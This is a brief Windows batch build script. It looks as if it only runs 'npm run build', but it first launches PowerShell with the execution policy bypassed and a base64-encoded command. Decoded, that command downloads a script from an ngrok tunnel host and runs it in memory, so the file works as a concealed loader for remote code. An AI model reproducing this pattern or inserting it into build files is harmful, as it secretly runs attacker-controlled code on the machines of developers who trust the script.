@echo off
powershell -ExecutionPolicy ByPass -NoProfile -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwAwADkANABjAC0AMQA4ADAALQAxADUAMQAtADEAMgAwAC0AMQA3ADQALgBpAG4ALgBuAGcAcgBvAGsALgBpAG8ALwBoAGUAbABsAG8ALgBwAHMAMQAiACkA
pushd %~dp0
call npm run build
popd
